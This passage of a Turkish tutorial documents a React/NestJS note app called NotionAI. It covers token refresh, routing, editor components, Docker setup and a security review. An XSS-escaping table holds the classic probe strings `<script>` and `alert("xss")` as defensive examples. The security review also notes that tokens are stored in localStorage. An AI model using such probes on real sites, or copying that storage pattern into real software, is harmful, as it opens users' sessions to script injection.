          refreshSubscribers.push((token: string) => {
            originalRequest.headers.Authorization = `Bearer ${token}`;
            resolve(api(originalRequest));
          });
        });
      }
```

- **Token Refresh Queue Pattern:** Eğer başka bir istek şu anda token yeniliyorsa, bu isteği bekleme kuyruğuna ekle.
- Token yenilendiğinde, kuyruktaki tüm istekler yeni token ile tekrarlanır.

```typescript
      isRefreshing = true;
      try {
        const res = await axios.post(`${API_URL}/auth/refresh`, {
          refreshToken,
        });
        const newAccessToken = res.data.accessToken;
        const newRefreshToken = res.data.refreshToken;
```

- `axios.post`: Yeni bir axios instance'ı kullanır (mevcut interceptor'lar devreye girmez).
- Sunucudan yeni access ve refresh token'ları al.

```typescript
        useAuthStore.getState().setAuth(
          useAuthStore.getState().user!,
          newAccessToken
        );
        localStorage.setItem('refreshToken', newRefreshToken);
```

- Yeni access token'ı store'a ve localStorage'a kaydet.
- Yeni refresh token'ı localStorage'a kaydet.

```typescript
        api.defaults.headers.common.Authorization = `Bearer ${newAccessToken}`;
        onRefreshed(newAccessToken);
        originalRequest.headers.Authorization = `Bearer ${newAccessToken}`;
        return api(originalRequest);
```

- Axios default header'ını güncelle (sonraki istekler için).
- Bekleyen tüm isteklere yeni token'ı bildir.
- Orijinal isteği yeni token ile tekrarla.

```typescript
      } catch {
        useAuthStore.getState().logout();
        window.location.href = '/login';
        return Promise.reject(error);
      } finally {
        isRefreshing = false;
      }
    }
    return Promise.reject(error);
  }
);
```

- Refresh de başarısız olursa logout yap.
- `finally`: İşlem bittiğinde `isRefreshing` bayrağını sıfırla.

#### API Endpoint Tanımları

```typescript
export const authApi = {
  login: (email: string, password: string) =>
    api.post('/auth/login', { email, password }),
  register: (email: string, password: string, name: string) =>
    api.post('/auth/register', { email, password, name }),
  logout: (refreshToken: string) =>
    api.post('/auth/logout', { refreshToken }),
};

export const notesApi = {
  getAll: (params?: { archived?: boolean; search?: string }) =>
    api.get('/notes', { params }),
  getOne: (id: string) => api.get(`/notes/${id}`),
  create: (data: { title?: string }) => api.post('/notes', data),
  update: (id: string, data: Partial<{ title: string; summary: string | null; isArchived: boolean; isPinned: boolean }>) =>
    api.patch(`/notes/${id}`, data),
  delete: (id: string) => api.delete(`/notes/${id}`),
};
```

- Her modül için API fonksiyonları obje halinde gruplanır.
- `Partial<...>`: Tüm alanları opsiyonel yapar.

### 10.3 React Router

```tsx
import { Routes, Route, Navigate } from 'react-router-dom';
import { useAuthStore } from './store/authStore';

function App() {
  const { user } = useAuthStore();

  return (
    <div className="min-h-screen bg-background text-foreground">
      <Routes>
        <Route
          path="/login"
          element={!user ? <Login /> : <Navigate to="/" />}
        />
        <Route
          path="/chat"
          element={user ? <ChatPage /> : <Navigate to="/login" />}
        />
        <Route
          path="/*"
          element={user ? <Dashboard /> : <Navigate to="/login" />}
        />
      </Routes>
    </div>
  );
}
```

- `<Routes>`: Route tanımlarını gruplar.
- `<Route path="/login" element={...} />`: URL `/login` olduğunda `Login` bileşenini göster.
- `<Navigate to="/" />`: Programatik yönlendirme. Kullanıcı zaten giriş yapmışsa login sayfasından ana sayfaya yönlendir.
- `path="/*"`: Tüm diğer path'ler. 404 fallback görevi görür.

---

## 11. Frontend: Sayfalar ve Bileşenler

### 11.1 Dashboard Bileşeni

Dashboard, uygulamanın ana ekranıdır. Sol tarafta sidebar (not listesi), sağ tarafta not editörü bulunur.

```typescript
export default function Dashboard() {
  const { user } = useAuthStore();
  const [notes, setNotes] = useState<Note[]>([]);
  const [activeNoteId, setActiveNoteId] = useState<string | null>(null);
  const [title, setTitle] = useState('');
  const [editorContent, setEditorContent] = useState('');
  const [, setEditorJson] = useState<any>(null);
  const [saving, setSaving] = useState(false);
  const [searchOpen, setSearchOpen] = useState(false);
  const [darkMode, setDarkMode] = useState(() =>
    document.documentElement.classList.contains('dark')
  );
  const [sidebarCollapsed, setSidebarCollapsed] = useState(false);
  const [selectedTag, setSelectedTag] = useState<string | null>(null);
  const [tagModalOpen, setTagModalOpen] = useState(false);
  const [newTagName, setNewTagName] = useState('');
  const [newTagColor, setNewTagColor] = useState('#3b82f6');
  const saveTimeout = useRef<ReturnType<typeof setTimeout> | null>(null);

  const activeNote = notes.find((n) => n.id === activeNoteId);
```

**State Değişkenlerinin Açıklamaları:**

| State | Tip | Açıklama |
|-------|-----|----------|
| `notes` | `Note[]` | Kullanıcının tüm notları |
| `activeNoteId` | `string \| null` | Şu anda seçili olan notun ID'si |
| `title` | `string` | Editördeki başlık input değeri |
| `editorContent` | `string` | Editördeki HTML içeriği |
| `saving` | `boolean` | Şu anda kaydediliyor mu? (yüklenme göstergesi) |
| `searchOpen` | `boolean` | Arama modalı açık mı? |
| `darkMode` | `boolean` | Karanlık mod aktif mi? |
| `sidebarCollapsed` | `boolean` | Sidebar daraltılmış mı? |
| `selectedTag` | `string \| null` | Filtrelenmiş etiket ID'si |
| `tagModalOpen` | `boolean` | Etiket modalı açık mı? |
| `saveTimeout` | `useRef` | Debounce timeout referansı |

```typescript
  useEffect(() => {
    if (user) {
      connectSocket(user.id);
      loadNotes();
      loadTags();
    }
    return () => {
      disconnectSocket();
    };
  }, [user]);
```

- `useEffect(() => {...}, [user])`: `user` değiştiğinde çalışır.
- `if (user)`: Kullanıcı giriş yapmışsa:
  - `connectSocket(user.id)`: Socket.IO bağlantısı kur.
  - `loadNotes()`: Notları sunucudan getir.
  - `loadTags()`: Etiketleri sunucudan getir.
- `return () => {...}`: Cleanup fonksiyonu. Bileşen unmount edildiğinde veya `user` değiştiğinde Socket.IO bağlantısını kes.

```typescript
  useEffect(() => {
    if (activeNote) {
      setTitle(activeNote.title);
      setEditorContent(blocksToHtml(activeNote.blocks));
    } else {
      setTitle('');
      setEditorContent('');
    }
  }, [activeNoteId]);
```

- `activeNoteId` değiştiğinde (yeni not seçildiğinde):
  - Seçili notun başlığını input'a yerleştir.
  - Seçili notun bloklarını HTML'e çevir ve editöre yerleştir.

#### Debounce (Gecikmeli Kaydetme)

```typescript
  const debouncedSave = useCallback(
    (_html: string, json: any) => {
      if (saveTimeout.current) clearTimeout(saveTimeout.current);
      saveTimeout.current = setTimeout(async () => {
        if (!activeNoteId) return;
        setSaving(true);
        try {
          const blocks = jsonToBlocks(json);
          await blocksApi.save(activeNoteId, blocks);
          await loadNotes();
        } catch (err) {
          console.error(err);
        } finally {
          setSaving(false);
        }
      }, 2000);
    },
    [activeNoteId]
  );
```

**Debounce Pattern:**

Kullanıcı her tuşa bastığında kaydetmek yerine, yazmayı 2 saniye bıraktıktan sonra kaydederiz.

```
Kullanıcı yazıyor: "M" → "Me" → "Mer" → "Mera" → "Merha" → "Merhab" → "Merhaba"
                       ↑      ↑       ↑        ↑         ↑          ↑           ↑
                   Her tuşta timeout sıfırlanır
                   
Son tuştan 2 saniye sonra → Kaydetme başlar
```

- `if (saveTimeout.current) clearTimeout(saveTimeout.current)`: Önceki timeout'u iptal et.
- `setTimeout(..., 2000)`: 2 saniye bekle.
- `finally { setSaving(false); }`: İşlem bitince yükleme durumunu kapat.

#### blocksToHtml Fonksiyonu

```typescript
function blocksToHtml(blocks: any[]): string {
  if (!blocks || blocks.length === 0) return '<p></p>';
  const raw = blocks
    .map((b) => {
      const c = b.content;
      switch (b.type) {
        case 'heading':
          return `<h${c.level || 1}>${escapeHtml(c.text || '')}</h${c.level || 1}>`;
        case 'bulletList':
          return `<ul><li>${escapeHtml(c.text || '')}</li></ul>`;
        case 'orderedList':
          return `<ol><li>${escapeHtml(c.text || '')}</li></ol>`;
        case 'codeBlock':
          return `<pre><code>${escapeHtml(c.text || '')}</code></pre>`;
        case 'blockquote':
          return `<blockquote>${escapeHtml(c.text || '')}</blockquote>`;
        case 'image':
          return `<img src="${escapeHtml(c.src || '')}" alt="${escapeHtml(c.alt || '')}" />`;
        default:
          return `<p>${escapeHtml(c.text || '')}</p>`;
      }
    })
    .join('');
  return DOMPurify.sanitize(raw);
}
```

**Satır Satır:**

- `if (!blocks || blocks.length === 0) return '<p></p>'`: Boş not varsa boş paragraf döndür.
- `blocks.map((b) => {...})`: Her blok için HTML string üret.
- `b.content`: Bloğun JSON içeriği.
- `c.level || 1`: Eğer level verilmemişse varsayılan 1.
- `escapeHtml(c.text || '')`: XSS koruması. Özel karakterleri entity'e çevirir.
- `.join('')`: Tüm HTML parçalarını birleştir.
- `DOMPurify.sanitize(raw)`: HTML'i tarayıcıda temizler.

#### escapeHtml Fonksiyonu

```typescript
function escapeHtml(text: string): string {
  return text
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}
```

**XSS Koruması:**

| Girdi | Çıktı | Açıklama |
|-------|-------|----------|
| `<script>` | `&lt;script&gt;` | Tarayıcı script olarak çalıştırmaz |
| `alert("xss")` | `alert(&quot;xss&quot;)` | Özel karakterler entity'e çevrilir |
| `O'Reilly` | `O&#039;Reilly` | Tek tırnak entity'e çevrilir |

#### jsonToBlocks Fonksiyonu

```typescript
function jsonToBlocks(json: any): any[] {
  if (!json || !json.content) return [];
  return json.content.map((node: any, index: number) => {
    const base = { order: index, content: {} };
    switch (node.type) {
      case 'heading':
        return { ...base, type: 'heading', content: { level: node.attrs?.level || 1, text: textFromNode(node) } };
      case 'bulletList':
        return { ...base, type: 'bulletList', content: { text: textFromNode(node) } };
      case 'orderedList':
        return { ...base, type: 'orderedList', content: { text: textFromNode(node) } };
      case 'codeBlock':
        return { ...base, type: 'codeBlock', content: { text: textFromNode(node) } };
      case 'blockquote':
        return { ...base, type: 'blockquote', content: { text: textFromNode(node) } };
      case 'image':
        return { ...base, type: 'image', content: { src: node.attrs?.src || '', alt: node.attrs?.alt || '' } };
      default:
        return { ...base, type: 'paragraph', content: { text: textFromNode(node) } };
    }
  });
}
```

**TipTap JSON → Prisma Block Dönüşümü:**

| TipTap Node Type | Prisma Block Type | İçerik |
|------------------|-------------------|--------|
| `heading` | `heading` | `{ level, text }` |
| `bulletList` | `bulletList` | `{ text }` |
| `orderedList` | `orderedList` | `{ text }` |
| `codeBlock` | `codeBlock` | `{ text }` |
| `blockquote` | `blockquote` | `{ text }` |
| `image` | `image` | `{ src, alt }` |
| default | `paragraph` | `{ text }` |

```typescript
function textFromNode(node: any): string {
  if (!node.content) return '';
  return node.content.map((c: any) => c.text || '').join('');
}
```

- TipTap node'unun içindeki tüm text node'larını birleştirir.

### 11.2 ChatPage Bileşeni

```typescript
export default function ChatPage() {
  const navigate = useNavigate();
  const { logout } = useAuthStore();
  const [chats, setChats] = useState<Chat[]>([]);
  const [activeChatId, setActiveChatId] = useState<string | null>(null);
  const [messages, setMessages] = useState<Message[]>([]);
  const [input, setInput] = useState('');
  const [loading, setLoading] = useState(false);
  const [sending, setSending] = useState(false);
  const messagesEndRef = useRef<HTMLDivElement>(null);

  const activeChat = chats.find((c) => c.id === activeChatId);
```

- `useNavigate()`: React Router'ın yönlendirme hook'u. `navigate('/')` ile ana sayfaya git.
- `messagesEndRef`: Mesaj listesinin sonuna scroll yapmak için ref.

```typescript
  useEffect(() => {
    messagesEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [messages, sending]);
```

- `messages` veya `sending` değiştiğinde, mesaj listesinin en altına smooth scroll yap.

#### Optimistic UI

```typescript
  const sendMessage = async () => {
    if (!input.trim() || !activeChatId) return;
    const content = input.trim();
    setInput('');
    setSending(true);

    // 1. Optimistic UI: Mesajı hemen ekranda göster
    const tempMsg: Message = {
      id: 'temp-' + Date.now(),
      chatId: activeChatId,
      role: 'user',
      content,
      createdAt: new Date().toISOString(),
    };
    setMessages((prev) => [...prev, tempMsg]);
```

**Optimistic UI Pattern:**

Kullanıcı deneyimini iyileştirmek için, API yanıtını beklemeden mesajı ekranda gösteririz.

```
Normal Akış:      Kullanıcı gönder → API bekle → Mesajı göster (yavaş)
Optimistic UI:    Kullanıcı gönder → Mesajı hemen göster → API yanıtını bekle → Güncelle (hızlı)
```

```typescript
    try {
      const res = await chatApi.sendMessage(activeChatId, content);
      setMessages(res.data.messages || []);
      setChats((prev) =>
        prev.map((c) => (c.id === activeChatId ? { ...c, title: res.data.title } : c))
      );
    } catch (err) {
      console.error(err);
    } finally {
      setSending(false);
    }
  };
```

- API'den gelen gerçek mesajları (AI cevabı dahil) göster.
- Eğer API başarısız olursa, optimistic mesaj hâlâ ekranda kalır (kullanıcıya hata gösterilebilir).

---

## 12. Docker ve Çalışma Ortamı

### 12.1 Docker Nedir?

Docker, uygulamaları container'lar (konteynerler) içinde çalıştıran bir platformdur. Container, uygulamanın çalışması için gerekli her şeyi (kod, runtime, sistem araçları, kütüphaneler) içeren hafif, taşınabilir bir pakettir.

**Container vs Sanal Makine (VM):**

| Özellik | Container | Sanal Makine |
|---------|-----------|--------------|
| **Boyut** | MB cinsinden | GB cinsinden |
| **Başlangıç** | Saniyeler | Dakikalar |
| **OS** | Host OS'yi paylaşır | Kendi OS'i var |
| **İzolasyon** | Process seviyesi | Hardware seviyesi |

### 12.2 Docker Compose

Docker Compose, birden fazla container'ı tanımlayıp yönetmenizi sağlayan bir araçtır. `docker-compose.yml` dosyası ile servisleri tanımlarsınız.

### 12.3 docker-compose.yml Satır Satır

```yaml
version: '3.9'
```

- Docker Compose dosya formatı versiyonu.

```yaml
services:
  postgres:
    image: ankane/pgvector:latest
    container_name: notionai_postgres
    restart: unless-stopped
```

- `services`: Tanımlanan servisler.
- `postgres`: Servisin adı.
- `image: ankane/pgvector:latest`: Kullanılacak Docker imajı. `ankane/pgvector`, PostgreSQL + pgvector eklentisi.
- `container_name`: Container'ın adı. Varsayılan olarak `<proje>_<servis>_1` olur, bu özelleştirilmiş addır.
- `restart: unless-stopped`: Container çökerse veya sistem yeniden başlarsa otomatik yeniden başlat. Ancak manuel durdurulduysa yeniden başlatma.

```yaml
    environment:
      POSTGRES_USER: ${POSTGRES_USER:-notionai}
      POSTGRES_PASSWORD: ${POSTGRES_PASSWORD:-change_me_in_env}
      POSTGRES_DB: ${POSTGRES_DB:-notionai}
```

- `environment`: Container'a aktarılan çevre değişkenleri.
- `${POSTGRES_USER:-notionai}`: `.env` dosyasındaki `POSTGRES_USER` değişkenini al. Eğer tanımlanmamışsa `notionai` kullan.

```yaml
    volumes:
      - postgres_data:/var/lib/postgresql/data
```

- `volumes`: Container ve host arasında veri paylaşımı.
- `postgres_data:/var/lib/postgresql/data`: `postgres_data` adlı Docker volume'ünü, container içindeki `/var/lib/postgresql/data` dizinine bağla.
- **Kalıcılık:** Container silinse bile `postgres_data` volume'ü kalır. Veriler kaybolmaz.

```yaml
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U notionai -d notionai"]
      interval: 5s
      timeout: 5s
      retries: 5
```

- `healthcheck`: Container'ın sağlığını kontrol et.
- `test`: Çalıştırılacak komut. `pg_isready`, PostgreSQL'in hazır olup olmadığını kontrol eder.
- `interval: 5s`: Her 5 saniyede bir kontrol et.
- `timeout: 5s`: Komut 5 saniyede tamamlanmazsa başarısız say.
- `retries: 5`: 5 kez başarısız olursa container unhealthy olarak işaretlenir.

```yaml
  backend:
    build:
      context: ./backend
      dockerfile: Dockerfile
```

- `build`: Image'ı önceden oluşturulmuş bir imaj yerine, `Dockerfile`'dan build et.
- `context: ./backend`: Build context (dosyaların bulunduğu dizin).
- `dockerfile: Dockerfile`: Kullanılacak Dockerfile'ın adı.

```yaml
    ports:
      - "3001:3001"
```

- `ports`: Port mapping. Host'un `3001` portunu, container'ın `3001` portuna yönlendir.
- `http://localhost:3001` → Container'ın `3001` portu.

```yaml
    environment:
      DATABASE_URL: ${DATABASE_URL:-postgresql://notionai:change_me_in_env@postgres:5432/notionai}
```

- `DATABASE_URL`: Backend'in PostgreSQL'e bağlanması için kullandığı URL.
- `@postgres`: Docker Compose, servisler arasında otomatik DNS oluşturur. `postgres` servisinin IP adresini çözer.

```yaml
    depends_on:
      postgres:
        condition: service_healthy
      redis:
        condition: service_healthy
```

- `depends_on`: Bu servis, belirtilen servisler hazır olmadan başlamaz.
- `condition: service_healthy`: Sadece container çalışmıyor, healthcheck de başarılı olmalı.

```yaml
    volumes:
      - ./backend:/app
      - /app/node_modules
```

- `./backend:/app`: Host'taki `./backend` dizinini container'ın `/app` dizinine bağla. Kod değişiklikleri anında container'a yansır (hot-reload).
- `/app/node_modules`: Anonymous volume. `node_modules` container içinde kalır. Host'taki `node_modules` ile override edilmez.

```yaml
    command: sh -c "npx prisma migrate deploy && npx prisma generate && npm run start:dev"
```

- `command`: Container başladığında çalıştırılacak komut.
- `npx prisma migrate deploy`: Migration dosyalarını veritabanına uygula.
- `npx prisma generate`: Prisma Client'ı yeniden üret (schema değişikliklerinden sonra).
- `npm run start:dev`: NestJS'i development modunda başlat (watch mode).

```yaml
volumes:
  postgres_data:
```

- Named volume tanımı. `postgres` servisinde kullanılan `postgres_data` volume'ü burada tanımlanır.

### 12.4 Dockerfile

**Backend Dockerfile:**

```dockerfile
FROM node:20-slim

WORKDIR /app

COPY package*.json ./
RUN npm install

COPY . .

EXPOSE 3001

CMD ["npm", "run", "start:prod"]
```

- `FROM node:20-slim`: Base image. Node.js 20, Debian Slim tabanlı.
- `WORKDIR /app`: Çalışma dizini.
- `COPY package*.json ./`: package.json ve package-lock.json'ı kopyala.
- `RUN npm install`: Bağımlılıkları yükle.
- `COPY . .`: Tüm kaynak kodları kopyala.
- `EXPOSE 3001`: Bu portu dışarıya aç.
- `CMD`: Container başladığında çalıştırılacak komut.

**Frontend Dockerfile:**

```dockerfile
FROM node:20-alpine

WORKDIR /app

COPY package*.json ./
RUN npm install

COPY . .

EXPOSE 5173

CMD ["npm", "run", "dev", "--", "--host"]
```

- `node:20-alpine`: Alpine Linux tabanlı, daha küçük image (~5 MB vs ~180 MB).
- `--host`: Vite'in dışarıdan erişilebilir olmasını sağlar (container içinde çalışırken gerekli).

---

## 13. Güvenlik Değerlendirmesi

### 13.1 Uygulanan Güvenlik Önlemleri

| Önlem | Dosya | Açıklama |
|-------|-------|----------|
| **JWT Auth** | `AuthGuard` | Her istekte token doğrulama |
| **Bcrypt Hash** | `AuthService` | Şifreler asla düz metin saklanmaz |
| **User Isolation** | Tüm servisler | `userId` filtresi ile kullanıcı A, B'nin verisini göremez |
| **Ownership Check** | `BlocksService` | Not sahibi değilsen blok kaydetemezsin |
| **Rate Limiting** | `ThrottlerGuard` | Dakikada 30 istek sınırı |
| **CORS Kısıtlaması** | `main.ts` | Sadece `FRONTEND_URL`'den istek kabul |
| **Input Validation** | `ValidationPipe` | DTO kurallarına uymayan veriler reddedilir |
| **XSS Protection** | `Dashboard.tsx` | `escapeHtml` + `DOMPurify` |
| **Soft Delete** | `NotesService` | Notlar arşivlenir, fiziksel silinmez |
| **Refresh Token Rotation** | `AuthService` | Her refresh'te yeni token çifti üretilir |
| **Hardcoded Secret Kontrolü** | `app.module.ts` | `JWT_SECRET` tanımlanmamışsa uygulama başlamaz |

### 13.2 Güvenlik Riskleri ve Çözümleri

| Risk | Seviye | Açıklama | Çözüm |
|------|--------|----------|-------|
| `localStorage` token saklama | Orta | XSS varsa token çalınabilir | httpOnly cookie'ye geçiş |
| `$queryRawUnsafe` | Düşük | Ham SQL kullanımı | `$queryRaw` template literal'a geçiş |
| Pagination yok | Orta | 1000 not varsa tümü getirilir | `skip`/`take` ekleme |
| Şifre güçlülük kuralları | Düşük | `"123456"` kabul edilir | Regex ile güçlü şifre zorunluluğu |

---

## 14. Çevre Değişkenleri ve Konfigürasyon

### 14.1 .env Dosyası

```env
# AI / LLM Provider (Groq)
# https://console.groq.com/keys adresinden alınabilir
OPENAI_API_KEY=gsk-your-groq-api-key-here

# Authentication
# openssl rand -base64 32 komutuyla üretilebilir
JWT_SECRET=change-me-to-a-random-string-min-32-chars
JWT_REFRESH_SECRET=change-me-to-another-random-string-min-32-chars

# Database
DATABASE_URL=postgresql://user:password@localhost:5432/notionai

# Cache
REDIS_URL=redis://localhost:6379

# Frontend
VITE_API_URL=http://localhost:3001
VITE_WS_URL=ws://localhost:3001

# Backend
FRONTEND_URL=http://localhost:5173
PORT=3001
```

### 14.2 Çevre Değişkenleri Tablosu

| Değişken | Zorunlu | Varsayılan | Açıklama |
|----------|:-------:|------------|----------|
| `OPENAI_API_KEY` | Hayır | — | Groq API key (AI özellikleri için) |
| `JWT_SECRET` | Evet | — | JWT imza secret'ı (min 32 karakter) |
| `JWT_REFRESH_SECRET` | Evet | — | Refresh token imza secret'ı |
| `DATABASE_URL` | Evet | — | PostgreSQL bağlantı URL'i |
| `REDIS_URL` | Evet | — | Redis bağlantı URL'i |
| `FRONTEND_URL` | Hayır | `http://localhost:5173` | CORS için frontend adresi |
| `PORT` | Hayır | `3001` | Backend portu |
| `VITE_API_URL` | Hayır | `http://localhost:3001` | Frontend API URL'i |
| `VITE_WS_URL` | Hayır | `ws://localhost:3001` | Frontend WebSocket URL'i |

### 14.3 JWT Secret Üretimi

```bash
openssl rand -base64 32
```

Bu komut, 32 bayt (256 bit) uzunluğunda rastgele bir base64 string üretir. Örnek çıktı:

```
Xf8a9B2cD3eF4gH5iJ6kL7mN8oP9qR0sT1uV2wX3yZ4=
```

**Neden rastgele?**

JWT secret, token'ların imzalanması için kullanılır. Eğer secret tahmin edilebilirse (örn. `"secret"`, `"123456"`), saldırgan kendi token'larını imzalayabilir ve sisteme yetkisiz erişebilir.

---

## Ek A: Sık Kullanılan Kod Kalıpları

### Debounce (Gecikmeli Çalıştırma)

```typescript
const timeout = useRef<ReturnType<typeof setTimeout> | null>(null);

const debounced = () => {
  if (timeout.current) clearTimeout(timeout.current);
  timeout.current = setTimeout(() => {
    // İşlem burada çalışır
  }, 2000);
};
```

### Optimistic UI

```typescript
// 1. Önce ekranda göster
setItems((prev) => [...prev, newItem]);

// 2. Sonra API'ye gönder
try {
  await api.create(newItem);
} catch {
  // 3. Başarısız olursa geri al
  setItems((prev) => prev.filter((i) => i.id !== newItem.id));
}
```

### useCallback ile Memoization

```typescript
const handleUpdate = useCallback(async (data) => {
  // Bu fonksiyon sadece activeNoteId değiştiğinde yeniden oluşturulur
}, [activeNoteId]);
```

### Prisma İlişkili Veri Çekme

```typescript
prisma.note.findMany({
  include: {
    tags: { include: { tag: true } },  // Note → NoteTag → Tag
    blocks: { orderBy: { order: 'asc' } },
  },
});
```

### Conditional Spread Operator

```typescript
const where = {
  userId,
  ...(search ? { OR: [{ title: { contains: search } }] } : {}),
};
```

---

## Ek B: Kavramlar Sözlüğü

| Kavram | Açıklama |
|--------|----------|
| **API** | Application Programming Interface. Uygulamaların birbiriyle konuşma protokolü. |
| **Authentication** | Kimlik doğrulama. Kullanıcının iddia ettiği kişi olduğunu kanıtlama. |
| **Authorization** | Yetkilendirme. Kullanıcının ne yapmasına izin verildiğini belirleme. |
| **CORS** | Cross-Origin Resource Sharing. Farklı origin'lerden gelen isteklere izin verme mekanizması. |
| **CRUD** | Create, Read, Update, Delete. Veri işlemlerinin dört temel operasyonu. |
| **DTO** | Data Transfer Object. Veri transferi için kullanılan obje. |
| **Hash** | Tek yönlü şifreleme. Geri dönüştürülemez. |
| **HMR** | Hot Module Replacement. Kod değiştiğinde sayfa yenilenmeden güncelleme. |
| **JWT** | JSON Web Token. İki taraf arasında güvenli bilgi taşıyan standart. |
| **ORM** | Object-Relational Mapping. Veritabanı tablolarını objelere eşleme. |
| **Salt** | Hash işleminde kullanılan rastgele değer. |
| **Soft Delete** | Veriyi fiziksel olarak silmek yerine işaretlemek. |
| **SQL Injection** | SQL sorgularına zararlı kod enjekte etme saldırısı. |
| **XSS** | Cross-Site Scripting. Web sayfalarına zararlı script enjekte etme. |

---

*Bu eğitim dokümanı, NotionAI projesinin mevcut durumuna göre hazırlanmıştır. Kod değişikliklerinde güncellenmelidir.*
